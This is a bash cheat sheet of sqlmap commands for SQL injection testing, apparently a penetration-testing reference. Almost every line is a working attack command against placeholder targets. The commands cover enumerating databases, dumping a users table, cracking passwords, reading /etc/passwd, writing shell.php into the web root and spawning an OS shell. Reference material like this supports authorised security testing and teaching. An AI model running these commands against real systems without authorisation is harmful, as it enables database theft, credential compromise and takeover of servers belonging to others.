```bash
sqlmap -h  # View the basic help
sqlmap -hh  # View the advanced help
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch  # Run sqlmap without asking for user input
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'  # Use POST request with given body
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'  # POST request with '*' marking the injection point
sqlmap -r req.txt  # Pass an HTTP request file to sqlmap
sqlmap -u "http://www.example.com/" --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'  # Specify a cookie header
sqlmap -u "http://www.target.com/" --data='id=1' --method PUT  # Send a PUT request with data
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt  # Store HTTP traffic to an output file
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch  # Set verbosity level to 6 and run non-interactively

# --- Essentials / enumeration & tuning ---
sqlmap -u "http://www.example.com/?q=test" --prefix="%'))" --suffix="-- -"  # Use custom prefix/suffix around payloads
sqlmap -u "http://www.example.com/?id=1" -v 3 --level=5  # Increase verbosity and set level (and risk defaults)
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba  # Basic DB enumeration (banner, current user/db, DBA check)
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb  # Enumerate tables in database 'testdb'
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname  # Dump specified columns from 'users' table
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"  # Conditional dump using WHERE clause
sqlmap -u "http://www.example.com/?id=1" --schema  # Retrieve database schema information
sqlmap -u "http://www.example.com/?id=1" --search -T user  # Search the DB for entries related to table 'user'
sqlmap -u "http://www.example.com/?id=1" --passwords --batch  # Attempt password enumeration and cracking (non-interactive)
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"  # Handle/automate anti-CSRF token in POST
sqlmap --list-tampers  # List all available tamper scripts
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba  # Check whether the DB user has DBA privileges
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"  # Read a local file from the server (if possible)
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"  # Write a file to the target filesystem
sqlmap -u "http://www.example.com/?id=1" --os-shell  # Try to spawn an interactive OS shell on the target

```